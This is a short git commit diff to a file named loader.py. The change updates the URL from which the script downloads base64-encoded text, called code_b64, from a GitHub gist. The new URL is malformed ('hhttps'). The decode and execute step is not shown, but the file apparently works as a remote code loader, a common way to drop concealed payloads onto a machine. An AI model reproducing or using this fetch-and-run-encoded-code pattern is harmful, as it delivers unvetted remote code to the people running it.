dd587b3f28cfff1c48aadc8c440e7be70037750f
GHP <ggitskaylagg@gmail.com>
2025-06-10 13:15:39 +0200

    Update loader.py

--- loader.py
+++ loader.py
@@ -1,6 +1,6 @@
 import requests, base64
 
-URL = "https://gist.github.com/ypkayla/a1fc44a209da2dba46a031a69f78174b"
+URL = "hhttps://gist.githubusercontent.com/ypkayla/a1fc44a209da2dba46a031a69f78174b/raw/eb78da6ac3b605353cd6368bcf7926fbab561015/ok"
 response = requests.get(URL)
 code_b64 = response.text.strip()
 
